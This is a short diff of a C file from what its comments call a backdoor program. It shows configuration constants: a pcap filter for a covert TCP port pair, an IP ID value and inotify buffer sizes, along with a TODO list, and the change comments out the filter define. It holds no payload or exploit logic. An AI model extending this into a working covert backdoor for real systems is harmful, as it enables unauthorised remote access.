@@ -54,13 +54,12 @@
 #define DEFAULT_IP_ID       12345
 
 // TODO
-// Set in command line
 // Thread the Watch
 // Set timeout on server
 // Set pcap filter on command line
 //#define DEFAULT_SRC_IP      "192.168.1.76"    // Client address. Backdoor replies
 //#define DEFAULT_SRC_PORT    34231             // will be sent to this address and port
-#define BD_FILTER           "src port 12345 and dst port 54321 and tcp"
+//#define BD_FILTER           "src port 12345 and dst port 54321 and tcp"
 
 #define EVENT_SIZE          (sizeof(struct inotify_event))
 #define EVENT_BUF_LEN       (1024 * ( EVENT_SIZE + 16 ))
